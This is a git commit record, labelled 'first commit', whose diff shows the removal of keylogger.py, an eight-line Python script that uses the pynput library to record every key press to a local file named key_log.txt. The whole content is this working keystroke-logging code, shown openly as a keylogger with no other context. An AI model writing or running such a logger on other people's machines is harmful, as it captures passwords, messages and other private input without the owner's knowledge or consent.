42b725c0b8126b339ae52840a09337492760203f
Nana Yeboah <nanayeboah@Nanas-MacBook-Air.local>
2025-11-26 12:34:38 -0500

    first commit

--- keylogger.py
+++
@@ -1,8 +0,0 @@
-from pynput.keyboard import Listener
-
-def on_press(key):
-    with open("key_log.txt", "a") as file:
-        file.write(f"{key}\n")
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
